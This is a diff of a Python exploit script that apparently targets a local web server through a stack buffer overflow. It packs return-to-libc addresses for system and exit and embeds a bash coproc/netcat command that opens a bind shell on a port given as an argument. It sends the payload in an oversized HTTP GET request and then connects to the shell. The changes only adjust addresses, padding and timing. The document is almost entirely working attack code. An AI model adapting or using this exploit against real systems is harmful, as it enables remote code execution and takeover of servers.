@@ -17,15 +17,15 @@ p = ''
 
 p += pack('<I', 0xf7e59080) #system
 p += pack('<I', 0x08048bb4) #exit
-p += pack('<I', 0xffffcc10) #cmd
+p += pack('<I', 0xffffceff) #cmd
 p += pack('<I', 0xffffc850)
 p += pack('<I', 0xffffc850)
-p += ' '*340
+p += ' '*500
 p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "+sys.argv[2]+" <&${p[0]} >&${p[1]}'    "
-p += pack('<I', 0x00000000)
+#p += pack('<I', 0x00000000)
 sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
 
-time.sleep(5)
+time.sleep(2)
 
 port = int(sys.argv[2])
 sock = socket.create_connection(('127.0.0.1', port),
